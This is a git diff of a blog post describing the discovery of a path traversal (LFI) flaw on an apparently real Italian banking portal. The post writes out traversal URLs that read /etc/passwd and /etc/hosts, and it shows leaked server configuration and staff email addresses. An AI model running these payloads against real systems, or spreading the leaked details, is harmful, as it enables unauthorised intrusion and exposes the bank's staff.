@@ -4,11 +4,10 @@ title: How i found an LFI vulnerability on a major banking site
 layout: post
 ---
 Well yes, the title is a bit clickbait but that's what exactly happened some weeks ago when i was bored on an italian banking website, let's call it MPBbanking.<br><br>
-As always with "Great updates comes great responsability" for the Sysadmins that maintain such systems and that day since was their migration day <br>
-from an old platform to a new one (from mpbbanking to youweb.bankmpb) i decided to explore what new features this portal has to offer... Just a few clicks and everything seems responsive and too cool to be good so<br>
-i tried out the good'old LFI to be sure that everything was safe and configured correctly... Types on the web browser URL: youweb.bankmpb.it/../../../../etc/passwd <br>
+As always with "Great updates comes great responsability" for the Sysadmins that maintain such systems and that day since was their migration day from an old platform to a new one (from mpbbanking to youweb.bankmpb) i decided to explore what new features this portal has to offer... Just a few clicks and everything seems responsive and too cool to be good so i tried out the good'old LFI to be sure that everything was safe and configured correctly...  <br>
+Types on the web browser URL: youweb.bankmpb.it/../../../../etc/passwd <br>
 <br>
-# Created by anaconda<br>
+ Created by anaconda<br>
 <br>
 Users And Groups Exposed<br>
 <br>
@@ -31,14 +30,14 @@ of an entire DC.<br>
 But then i said well what if they aren't so badass and missed that, so i type:  youweb.bankmpb.it/../../../../etc/hosts and then .. :
 <br>
 ##########################<br>
-##     ATTENZIONE !!<br>
+#####ATTENZIONE !!<br>
 ##<br>
-## FILE GESTITO DA PUPPET<br>
-## NON MODIFICARE A MANO<br>
+##FILE GESTITO DA PUPPET<br>
+##NON MODIFICARE A MANO<br>
 ###########################<br>
 #<br>
 ###########<br>
-# VERONA<br>
+ VERONA<br>
 ###########<br>
 options timeout:1 attempts:1<br>
 search servizi *.group *.group *.zserver *.nexus<br>
@@ -55,10 +54,10 @@ nameserver *.*.140.25<br>
 <br>
 Wow... we are dealing with a DevOpser (a Master of Puppet)...and that is an LFI (*hacker-voice* "we are in", and i didn't even need my great tool inspect element to hack their JS/CSS).<br>
 So i kept checking if i can find the contact of their Sysadmin to report him this vulnerability that could cost them $$ if exploited well.... *checking postfix conf for contact* :<br>
-# trap decode to catch security attacks<br>
+#trap decode to catch security attacks<br>
 decode:		root<br>
 <br>
-# Person who should get root's mail<br>
+#Person who should get root's mail<br>
 #root:		marc<br>
 #root:		fabian.adam@mpbcorp-address.it,frank.life@mpbcorp-address.it <br>
 <br>
